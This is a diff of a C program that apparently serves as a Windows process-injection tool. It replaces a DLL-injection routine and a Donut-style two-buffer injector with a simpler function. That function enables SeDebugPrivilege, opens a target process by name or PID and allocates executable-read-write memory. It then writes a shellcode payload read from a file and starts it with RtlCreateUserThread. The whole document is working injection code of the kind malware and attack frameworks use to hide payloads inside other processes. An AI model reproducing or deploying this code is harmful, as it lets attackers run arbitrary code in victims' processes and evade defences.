@@ -33,6 +33,27 @@
 #include <stdio.h>
 #include <tlhelp32.h>
 
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "user32.lib")
+
+typedef struct _CLIENT_ID {
+     PVOID UniqueProcess;
+     PVOID UniqueThread;
+} CLIENT_ID, *PCLIENT_ID;
+
+typedef NTSTATUS (NTAPI *RtlCreateUserThread_t) (
+    IN  HANDLE ProcessHandle,
+    IN  PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
+    IN  BOOLEAN CreateSuspended,
+    IN  ULONG StackZeroBits,
+    IN  OUT  PULONG StackReserved,
+    IN  OUT  PULONG StackCommit,
+    IN  PVOID StartAddress,
+    IN  PVOID StartParameter OPTIONAL,
+    OUT PHANDLE ThreadHandle,
+    OUT PCLIENT_ID ClientID);
+    
 BOOL EnablePrivilege(PCHAR szPrivilege){
     HANDLE           hToken;
     BOOL             bResult;
@@ -106,115 +127,50 @@ DWORD name2pid(PCHAR procName){
     return pid;
 }
 
-#pragma comment(lib, "advapi32.lib")
-#pragma comment(lib, "shell32.lib")
-#pragma comment(lib, "user32.lib")
-
-/**
-typedef HMODULE (WINAPI *LoadLibrary_t)(LPCTSTR);
-
-BOOL injectDLL(DWORD id, PCHAR szPath) {
-    SIZE_T             wr;
-    LoadLibrary_t      pLoadLibrary;
-    HANDLE             hp,ht;
-    LPVOID             pPath;
-    SIZE_T             pathLen = lstrlen(szPath);
-    NtCreateThreadEx_t pNtCreateThreadEx;
-    HMODULE            hn;
-    NTSTATUS           nt=~0UL;
+BOOL injectPIC(DWORD id, LPVOID code, DWORD codeLen) {
+    SIZE_T                wr;
+    HANDLE                hp,ht;
+    LPVOID                cs;
+    RtlCreateUserThread_t pRtlCreateUserThread;
+    HMODULE               hn;
+    CLIENT_ID             cid;
+    NTSTATUS              nt=~0UL;
     
-    // resolve API address 
+    // 1. resolve API address 
     hn = GetModuleHandle("ntdll.dll");
-    pNtCreateThreadEx=(NtCreateThreadEx_t)
-        GetProcAddress(hn, "NtCreateThreadEx");
+    pRtlCreateUserThread=(RtlCreateUserThread_t)
+        GetProcAddress(hn, "RtlCreateUserThread");
     
-    // 1. open the target process
+    printf("  [ opening process %li\n", id);
+    // 2. open the target process
     hp=OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
     
-    // 2. allocate read-write (RW) memory for DLL path
-    pPath=VirtualAllocEx(hp, NULL, pathLen, 
-      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if(hp == NULL) return FALSE;
     
-    // 3. copy the path of DLL to remote memory
-    WriteProcessMemory(hp, pPath, szPath, pathLen+1, &wr); 
+    // 3. allocate executable-read-write (XRW) memory for payload
+    printf("  [ allocating memory for payload.\n");
+    cs=VirtualAllocEx(hp, NULL, codeLen, 
+      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
-    // 4. resolve the address of LoadLibrary
-    pLoadLibrary=(LoadLibrary_t)GetProcAddress(
-        GetModuleHandle("kernel32"), "LoadLibraryA");
+    // 4. copy the payload to remote memory
+    WriteProcessMemory(hp, cs, code, codeLen, &wr); 
       
-    // 5. execute LoadLibrary in remote process 
-    // with DLL path as parameter
-    nt=pNtCreateThreadEx(&ht, MAXIMUM_ALLOWED, NULL, 
-      hp, (LPTHREAD_START_ROUTINE)pLoadLibrary, pPath, 
-      0,0,0,0,NULL);
-      
-    SetLastError(RtlNtStatusToDosError(nt));
-    xstrerror("NtCreateThreadEx");
+    // 5. execute payload in remote process
+    printf("  [ creating new thread.\n");
+    nt = pRtlCreateUserThread(hp, NULL, FALSE, 0, NULL, 
+      NULL, cs, NULL, &ht, &cid);
     
+    printf("  [ nt status is %lx\n", nt);
     // 6. close remote thread handle
     CloseHandle(ht);
     
     // 7. free remote memory
-    VirtualFreeEx(hp, pPath, pathLen, 
-      MEM_RELEASE | MEM_DECOMMIT);
+    printf("  [ freeing memory.\n");
+    VirtualFreeEx(hp, cs, codeLen, MEM_RELEASE | MEM_DECOMMIT);
 
     // 8. close remote process handle
     CloseHandle(hp);
-    return nt==STATUS_SUCCESS;
-}
-*/
-BOOL injectPIC(DWORD id, LPVOID code, DWORD code_len, LPVOID data, DWORD data_len) {
-    SIZE_T             wr;
-    HANDLE             hp, ht;
-    LPVOID             cs, ds;
-    NtCreateThreadEx_t pNtCreateThreadEx;
-    HMODULE            hn;
-    NTSTATUS           nt=~0UL;
-    
-    // 1. resolve API address 
-    hn = GetModuleHandle("ntdll.dll");
-    pNtCreateThreadEx=(NtCreateThreadEx_t)
-        GetProcAddress(hn, "NtCreateThreadEx");
-    
-    // 2. open the target process
-    hp=OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);
-    
-    // 3. allocate executable-read-write (XRW) memory for payload
-    cs=VirtualAllocEx(hp, NULL, code_len, 
-      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-
-    ds=VirtualAllocEx(hp, NULL, data_len, 
-      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-      
-    // 4. copy the payload to remote memory
-    WriteProcessMemory(hp, cs, code, code_len, &wr); 
-    WriteProcessMemory(hp, ds, data, data_len, &wr); 
-      
-    // 5. execute payload in remote process
-    nt=pNtCreateThreadEx(&ht, MAXIMUM_ALLOWED, NULL, 
-      hp, (LPTHREAD_START_ROUTINE)cs, ds, 
-      0,0,0,0,NULL);
-      
-    SetLastError(RtlNtStatusToDosError(nt));
-    xstrerror("NtCreateThreadEx");
-    
-    // wait a few seconds
-    Sleep(1000*3);
-    
-    // 6. close remote thread handle
-    CloseHandle(ht);
-    
-    // 7. free remote code
-    VirtualFreeEx(hp, cs, code_len, 
-      MEM_RELEASE | MEM_DECOMMIT);
-
-    // 7. free remote data
-    VirtualFreeEx(hp, ds, data_len, 
-      MEM_RELEASE | MEM_DECOMMIT);
-      
-    // 8. close remote process handle
-    CloseHandle(hp);
-    return nt==STATUS_SUCCESS;
+    return nt == 0; // STATUS_SUCCESS
 }
 
 DWORD getdata(PCHAR path, LPVOID *data){
@@ -238,31 +194,27 @@ DWORD getdata(PCHAR path, LPVOID *data){
 }
 
 int main(int argc, char *argv[]){
-    LPVOID code, data;
-    SIZE_T code_len, data_len;
+    LPVOID code;
+    SIZE_T code_len;
     DWORD  pid;
 
-    if (argc < 4){
-      printf("usage: inject /pic /dll <process id | process name> <donut code> <donut data>\n");
+    if (argc != 3){
+      printf("\nusage: inject <process id | process name> <payload.bin>\n");
       return 0;
     }
     
-    EnablePrivilege(SE_DEBUG_NAME);
+    if(!EnablePrivilege(SE_DEBUG_NAME)) {
+      printf("cannot enable SeDebugPrivilege.\n");
+    }
     
     // get pid
-    pid=atoi(argv[2]);
-    if(pid==0) pid=name2pid(argv[2]);
+    pid=atoi(argv[1]);
+    if(pid==0) pid=name2pid(argv[1]);
     
-    // pic or dll?
-    if(strcmpi("/pic", argv[1])==0){
-      code_len = getdata(argv[3], &code);
-      data_len = getdata(argv[4], &data);
+    // pic
+    code_len = getdata(argv[2], &code);
       
-      injectPIC(pid, code, code_len, data, data_len);
-      free(code);
-      free(data);
-    } else if (strcmpi("/dll", argv[1])==0){
-      injectDLL(pid, argv[3]);
-    }
+    injectPIC(pid, code, code_len);
+    free(code);
     return 0;
 }
